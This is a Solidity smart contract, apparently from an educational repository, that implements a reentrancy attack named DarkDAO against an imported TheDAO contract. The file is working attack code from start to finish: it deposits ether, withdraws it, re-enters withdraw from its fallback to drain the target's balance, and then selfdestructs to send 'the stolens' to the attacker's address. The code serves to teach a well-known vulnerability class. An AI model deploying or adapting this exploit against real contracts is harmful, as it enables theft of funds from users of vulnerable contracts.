// SPDX-License-Identifier: MIT
// https://github.com/maAPPsDEV/reentrancy-attack

pragma solidity 0.7.0;

import "./TheDAO.sol";

contract DarkDAO {
  address payable public hacker;

  TheDAO targetContract;

  event Start(address indexed _target, uint256 _balance);
  event Stop(address indexed _target, uint256 _balance);
  event Reenter(address indexed _target, uint256 _balance);

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public payable onlyHacker {
    require(msg.value >= (1 ether), "Not enough ether to attack");
    targetContract = TheDAO(payable(_target));

    // 0. invest with the address of hacker contract
    targetContract.invest{value: (1 ether)}(address(this));

    // 1. withdraw the ether back to hacker contract
    emit Start(_target, address(this).balance);
    targetContract.withdraw(1 ether);
  }

  fallback() external payable {
    // 2. check target balance, if no more ether, stop attack

    // if (address(targetContract).balance < (1 ether)) {
    //   emit Stop(address(targetContract), address(this).balance);
    //   return;
    // }

    // 3. re-entrancy attack
    emit Reenter(address(targetContract), address(this).balance);
    targetContract.withdraw(1 ether);
  }

  function kill() external onlyHacker {
    // 4. get the stolens back to hacker account and disappear
    selfdestruct(hacker);
  }
}
